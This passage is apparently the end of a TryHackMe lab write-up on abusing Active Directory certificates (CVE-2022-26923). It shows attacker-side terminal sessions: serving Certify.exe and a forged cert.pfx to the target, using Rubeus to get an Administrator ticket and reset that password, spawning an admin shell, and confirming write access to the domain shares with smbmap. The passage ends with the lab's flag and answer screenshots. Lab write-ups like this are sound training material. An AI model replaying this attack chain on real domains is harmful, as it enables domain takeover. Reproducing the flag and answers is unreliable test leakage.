+UbYNA0LowCkE/U//2kFX4PtY/hGgCjD1gLC3NohW6NVjqGzWtrXfUm1kxQeqia9w
+2d39Cix0DgnetDCK7fw1p7ZYSd2qK30SxlK1C+5C1/CkI7X+W9fNNa1FrqQu2SaD
+zA==
+-----END CERTIFICATE-----
+
+┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
+└─$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+Enter Export Password:
+Verifying - Enter Export Password:
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
+└─$ ls
+ Certify.exe                        LockLess.exe          SharpDPAPI.exe
+ cert.pem                           README.md             SharpDump.exe
+ cert.pfx  
+
+┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
+└─$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.221.143 - - [16/Feb/2023 17:16:23] "GET /Certify.exe HTTP/1.1" 200 -
+
+PS C:\THMTools> iwr http://10.8.19.103:1337/cert.pfx -outfile C:\THMTools\cert.pfx
+
+┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
+└─$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.221.143 - - [16/Feb/2023 17:16:23] "GET /Certify.exe HTTP/1.1" 200 -
+10.10.221.143 - - [16/Feb/2023 17:25:53] "GET /cert.pfx HTTP/1.1" 200 -
+
+PS C:\THMTools> .\Rubeus.exe asktgt /user:Administrator /password:god /certificate:cert.pfx /outfile:ticket /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.0
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=Try THM. Hack Me, CN=Users, DC=lunar, DC=eruca, DC=com
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\Administrator'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+
+[*] Ticket written to ticket
+
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/lunar.eruca.com
+  ServiceRealm             :  LUNAR.ERUCA.COM
+  UserName                 :  Administrator
+  UserRealm                :  LUNAR.ERUCA.COM
+  StartTime                :  2/16/2023 10:27:49 PM
+  EndTime                  :  2/17/2023 8:27:49 AM
+  RenewTill                :  2/23/2023 10:27:49 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  2Vm4QWtID/aW/b4JrUCe+A==
+  ASREP (key)              :  5DFAA87BAA65B0004396E20C4A8ACA3F
+
+PS C:\THMTools> .\Rubeus.exe changepw /new:Witty123 /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\Administrator /ticket:ticket
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.0
+
+[*] Action: Reset User Password (AoratoPw)
+
+[*] Using domain controller: LUNDC.lunar.eruca.com (10.10.221.143)
+[*] Resetting password for target user: lunar.eruca.com\Administrator
+[*] New password value: Witty123
+[*] Building AP-REQ for the MS Kpassword request
+[*] Building Authenticator with encryption key type: rc4_hmac
+[*] base64(session subkey): nmFkH56Yas8m7PxiDk2gRg==
+[*] Building the KRV-PRIV structure
+[+] Password change success!
+
+PS C:\THMTools> runas /user:lunar.eruca.com\Administrator cmd.exe
+Enter the password for lunar.eruca.com\Administrator:
+Attempting to start cmd.exe as user "lunar.eruca.com\Administrator" ...
+
+Microsoft Windows [Version 10.0.17763.1098]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+lunar\administrator
+
+┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
+└─$ smbmap -H 10.10.221.143 -u "Administrator" -p "Witty123"   
+[+] IP: 10.10.221.143:445	Name: 10.10.221.143                                     
+[|] Work[!] Unable to remove test directory at \\10.10.221.143\SYSVOL\WFJRCAHTLQ, please remove manually
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	READ, WRITE	Remote Admin
+	C$                                                	READ, WRITE	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ, WRITE	Logon server share 
+	SYSVOL                                            	READ, WRITE	Logon server share 
+
+:)
+
+Was really fun!
+```
+
+## Flags / Answers
+- ***THM{AD.Certs.Can.Get.You.DA}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6abc4f005b619e77d22020817efcd569.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8c9d6c304e49c30f2b3c4a5b586c4cae.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/62ddbaea280193db14af0a9344238fd7.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/a5fbd1d925d9c1324cfc96cdd476e433.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/1f56997d4b22983b9dea48464fa6a8db.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/70a553f60b4918a3071ead1916e5845d.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/2d39a4eb6c2b2cd58bb56fff09abde75.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/47d5d47980bf91b677d875f437c74469.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/225936c84f0ed2c8a2fe15c52a1960f1.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/31f93460740cead5c6ce6e5866179811.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/7d7374aaa95f5d957afb06b81b399746.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/2c8bc43dc7668685348047f862a0f4d5.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4d9bd287ce14470e92ff4c135c8ea211.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/74180544793b0cc3145b5b622511eef0.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/77ed2068688fdd36af550a404f222768.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/057502d0e144ca40907e79b8c046c009.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/ff46b7fa062164b5488b1648e18adee3.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/24d0b97ea00dcb4d75a5c0f60b744d75.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8db71b1509a16803e8d0b589db82f7af.png)
+
+## Notes / Lessons Learned
+[[CVE-2022-26923]]
+
